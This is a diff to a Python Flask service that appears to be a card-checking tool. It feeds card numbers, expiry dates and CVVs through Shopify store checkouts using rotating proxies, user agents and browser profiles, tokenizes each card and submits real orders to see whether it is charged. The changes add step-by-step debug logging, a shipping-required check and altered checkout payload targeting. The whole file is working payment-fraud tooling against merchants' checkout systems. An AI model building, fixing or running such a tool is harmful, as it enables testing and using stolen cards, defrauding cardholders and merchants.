@@ -88,11 +88,17 @@ def _dec_busy():
     with _workers_lock: _workers_busy = max(0, _workers_busy - 1)
 
 _last_failure = {}
+_debug_log = []
+
+def log(msg):
+    global _debug_log
+    _debug_log.append(msg)
+    print(msg, flush=True)
 
 def _fail(reason, **extra):
     global _last_failure
     _last_failure = {"reason": reason, "ts": int(time.time()), **extra}
-    print(f"[FAIL] {reason} | {extra}", flush=True)
+    log(f"[FAIL] {reason} | {extra}")
     return _resp(f"PROPOSAL_FAILED_{reason}")
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -213,6 +219,14 @@ def _total_from_rejected(b):
     except Exception: pass
     return ""
 
+def _is_shipping_required(b):
+    try:
+        d = json.loads(b)
+        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
+               .get("result",{}).get("sellerProposal",{}))
+        return sp.get("isShippingRequired", True)
+    except Exception: return True
+
 def _payment_method_id(b):
     try:
         data = json.loads(b)
@@ -309,9 +323,9 @@ def _graphql_ids(session, shop_url, checkout_html, ua, t_rem):
         return None, None, None
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🛒 PAYLOAD BUILDER (Strictly Digital)
+# 🛒 PAYLOAD BUILDER (Fixed targetMerchandiseLines logic)
 # ─────────────────────────────────────────────────────────────────────────────
-def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id, use_lines=False):
+def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id, use_lines=False, target_any=True):
     if addr:
         sa   = _street_addr(addr["fn"], addr["ln"], addr)
         dest = {"partialStreetAddress": {"address1":sa["address1"],"city":sa["city"],
@@ -323,6 +337,7 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
         bill = {"streetAddress": {"address1":"","city":"","countryCode":"US","lastName":"","phone":""}}
 
     merch_key = "lines" if use_lines else "merchandiseLines"
+    target_lines = {"any": True} if target_any else {"lines": [{"stableId": stable_id}]}
 
     return {
         "variables": {
@@ -339,9 +354,8 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
                         },
                         "options": {},
                     },
-                    # ═══ FIX: Target ONLY the digital item ═══
-                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-                    "deliveryMethodTypes":    ["NONE"], # Digital only
+                    "targetMerchandiseLines": target_lines, # ═══ FIX ═══
+                    "deliveryMethodTypes":    ["NONE"],
                     "expectedTotalPrice":     {"any": True},
                     "destinationChanged":     True,
                 }],
@@ -454,10 +468,9 @@ def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", 
         if r.status_code == 200:
             return r.json().get("id")
         else:
-            global _last_failure
-            _last_failure = {"reason": "PCI_HTTP", "status": r.status_code, "body": r.text[:200]}
+            log(f"PCI HTTP {r.status_code}: {r.text[:100]}")
     except Exception as e:
-        _last_failure = {"reason": "PCI_EXC", "err": str(e)[:100]}
+        log(f"PCI EXC: {str(e)[:100]}")
 
     if "shopifyinc" in endpoint:
         return _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig, "https://checkout.pci.shopifycs.com/sessions", vault_domain, proxy_url, t_rem)
@@ -486,9 +499,11 @@ def _classify_failed(code):
     return (c or "CARD_DECLINED"), False, False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🧠 PIPELINE (Strict Flow)
+# 🧠 PIPELINE (Strict Flow + Detailed Logs)
 # ─────────────────────────────────────────────────────────────────────────────
 def _run_check(card_str, proxy_str):
+    global _debug_log
+    _debug_log = []  # Reset logs for this check
     t_start = time.monotonic()
     def remain(): return BUDGET_SEC - (time.monotonic() - t_start)
     def t_max(sec): return min(sec, max(1, remain()))
@@ -507,6 +522,7 @@ def _run_check(card_str, proxy_str):
     price = prod["price"]
     if not price: price = "1.00"
 
+    log(f"--- Checking {shop_url} | Variant: {vid} ---")
     proxy_url = _parse_proxy(proxy_str)
     ua        = random.choice(USER_AGENTS)
     imp       = random.choice(BROWSER_PROFILES)
@@ -517,9 +533,12 @@ def _run_check(card_str, proxy_str):
     try:
         # ═══ Step 1: Cart ═══
         try:
-            r = session.get(f"{shop_url}/cart/{vid}:1", headers={"user-agent": ua},
-                            allow_redirects=True, timeout=t_max(4))
+            cart_url = f"{shop_url}/cart/{vid}:1"
+            log(f"Step 1: Cart Request -> {cart_url}")
+            r = session.get(cart_url, headers={"user-agent": ua}, allow_redirects=True, timeout=t_max(4))
+            log(f"Step 1: Cart Status -> {r.status_code}")
         except Exception as e:
+            log(f"Step 1: Cart EXC -> {str(e)[:100]}")
             return _resp("CART_FAILED", price=f"{price} USD")
         
         if r.status_code != 200:
@@ -532,6 +551,9 @@ def _run_check(card_str, proxy_str):
         session_token = _session_token(checkout_html)
         commit_sha    = _commit_sha(checkout_html)
         stable_id     = _stable_id(checkout_html)
+        log(f"Step 1: Session Token -> {'FOUND' if session_token else 'MISSING'}")
+        log(f"Step 1: Stable ID -> {'FOUND' if stable_id else 'MISSING'}")
+
         if not session_token: return _fail("NO_SESSION_TOKEN",  shop=shop_url)
         if not commit_sha:    return _fail("NO_COMMIT_SHA",     shop=shop_url)
         if not stable_id:     return _fail("NO_STABLE_ID",      shop=shop_url)
@@ -570,35 +592,41 @@ def _run_check(card_str, proxy_str):
 
         # ═══ Step 2: Proposal 1 (Empty) ═══
         try:
-            p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
+            log("Step 2: Proposal 1 (Empty)")
+            p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines, target_any=True)
             r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
             
             if r1.status_code == 200 and "INVALID_VARIABLE" in r1.text:
                 if "merchandiseLines" in r1.text and "not defined" in r1.text:
+                    log("Step 2: Swapping to 'lines' schema")
                     use_lines = True
-                    p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
+                    p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines, target_any=True)
                     r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
                     
         except Exception as e:
+            log(f"Step 2: Proposal 1 EXC -> {str(e)[:100]}")
             return _fail("P1_EXC", shop=shop_url, err=str(e)[:100])
+        
+        log(f"Step 2: Proposal 1 Status -> {r1.status_code}")
         if r1.status_code != 200:
-            if "SHIPPING_ADDRESS_UNDELIVERABLE" in r1.text or "no_delivery_options" in r1.text:
-                return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
             return _fail("P1_HTTP", shop=shop_url, status=r1.status_code, body=r1.text[:800])
+        
         queue_token = _queue_token(r1.text) or None
         if not queue_token:
             return _fail("P1_NO_QUEUE", shop=shop_url, body=r1.text[:800])
 
         # ═══ Step 3: Proposal 2 (Email) ═══
         try:
-            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines)
+            log("Step 3: Proposal 2 (Email)")
+            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines, target_any=True)
             p["variables"]["queueToken"] = queue_token
             r2 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
         except Exception as e:
+            log(f"Step 3: Proposal 2 EXC -> {str(e)[:100]}")
             return _fail("P2_EXC", shop=shop_url, err=str(e)[:100])
+        
+        log(f"Step 3: Proposal 2 Status -> {r2.status_code}")
         if r2.status_code != 200:
-            if "SHIPPING_ADDRESS_UNDELIVERABLE" in r2.text or "no_delivery_options" in r2.text:
-                return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
             return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])
 
         # ═══ Step 4: Proposal 3 (Address) ═══
@@ -611,13 +639,18 @@ def _run_check(card_str, proxy_str):
         r3_text = ""
 
         try:
-            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
+            log("Step 4: Proposal 3 (Address / Target Item)")
+            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines, target_any=False)
             p["variables"]["queueToken"] = queue_token
             r3 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
             
             if r3.status_code == 200:
                 r3_text = r3.text
+                shipping_required = _is_shipping_required(r3_text)
+                log(f"Step 4: isShippingRequired -> {shipping_required}")
+                
                 if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
+                    log("Step 4: SKIP_PHYSICAL triggered by address undeliverable")
                     return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
                 
                 pm_id  = _payment_method_id(r3_text) or _payment_method_id(r2.text) or _payment_method_id(r1.text)
@@ -626,19 +659,23 @@ def _run_check(card_str, proxy_str):
                 tax    = _tax_amount(r3_text)
                 amount_f = _checkout_total(r3_text) or amount
                 queue_token = _queue_token(r3_text) or queue_token
-                shipping_required = _is_shipping_required(r3_text)
             else:
+                log(f"Step 4: Proposal 3 HTTP -> {r3.status_code}")
                 return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}") 
-        except Exception:
+        except Exception as e:
+            log(f"Step 4: Proposal 3 EXC -> {str(e)[:100]}")
             return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}") 
 
         if not pm_id:
+            log("Step 4: Payment ID Missing from Proposals. Trying HTML fallback.")
             pm_id = _payment_method_id_from_html(checkout_html)
 
         if not pm_id:
+            log("Step 4: SKIP_NO_PM triggered (No payment method found)")
             return _resp("SKIP_NO_PM", price=f"{amount_f} {currency}")
 
-        if shipping_required and (not del_h or not signed):
+        if shipping_required:
+            log("Step 4: SKIP_PHYSICAL triggered (Store says shipping is required)")
             return _resp("SKIP_PHYSICAL", price=f"{amount_f} {currency}")
 
         # ═══ Step 5: PCI ═══
@@ -646,11 +683,14 @@ def _run_check(card_str, proxy_str):
         v_url     = _vault_url(checkout_html)
         v_dom     = _vault_domain(checkout_html)
 
+        log("Step 5: Tokenizing Card")
         sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua,
                         ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom, proxy_url=proxy_url, t_rem=t_max(4))
         
         if not sid: 
+            log("Step 5: PCI_FAILED")
             return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
+        log("Step 5: PCI Token Success")
 
         # ═══ Step 6: Submit ═══
         sa        = _street_addr(fn, ln, addr_raw)
@@ -796,6 +836,7 @@ def _run_check(card_str, proxy_str):
         cur_tax = tax or "0.0"
         cur_tot = amount_f
         
+        log("Step 6: Submitting Order")
         for tax_attempt in range(2):
             try:
                 r_submit = session.post(
@@ -805,9 +846,11 @@ def _run_check(card_str, proxy_str):
                 )
                 body = r_submit.text
             except Exception as e:
+                log(f"Step 6: Submit EXC -> {str(e)[:100]}")
                 return _fail("SUBMIT_EXC", shop=shop_url, err=str(e)[:100])
 
             if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in body or "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in body:
+                log("Step 6: Tax changed, retrying...")
                 nt = _tax_from_rejected(body)
                 nT = _total_from_rejected(body)
                 if nt: cur_tax = nt
@@ -817,6 +860,7 @@ def _run_check(card_str, proxy_str):
             break
 
         elapsed_ms = (time.monotonic() - t_start) * 1000
+        log(f"Step 6: Submit Response -> {body[:200]}")
 
         if '"ProcessedReceipt"' in body or '"SuccessfulReceipt"' in body:
             return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
@@ -830,6 +874,7 @@ def _run_check(card_str, proxy_str):
             rid = _receipt_id(body)
             rss = _receipt_session(body)
             if rid and rss and remain() > 4:
+                log("Step 6: Processing... polling receipt")
                 for _ in range(15):
                     if remain() < 2: break
                     time.sleep(0.5)
@@ -862,6 +907,7 @@ def _run_check(card_str, proxy_str):
         return _fail("UNKNOWN_BODY", shop=shop_url, body=body[:800], price=price_str)
 
     except Exception as e:
+        log(f"TOP EXC: {str(e)[:150]}")
         return _fail("TOP_EXC", shop=shop_url, err=str(e)[:150])
     finally:
         try: session.close()
@@ -890,7 +936,10 @@ def route_health():
 
 @app.route("/debug")
 def route_debug():
-    return jsonify(_last_failure if _last_failure else {"ok": "no failure recorded"})
+    return jsonify({
+        "last_failure": _last_failure,
+        "logs": _debug_log
+    })
 
 @app.route("/sites")
 def route_sites():
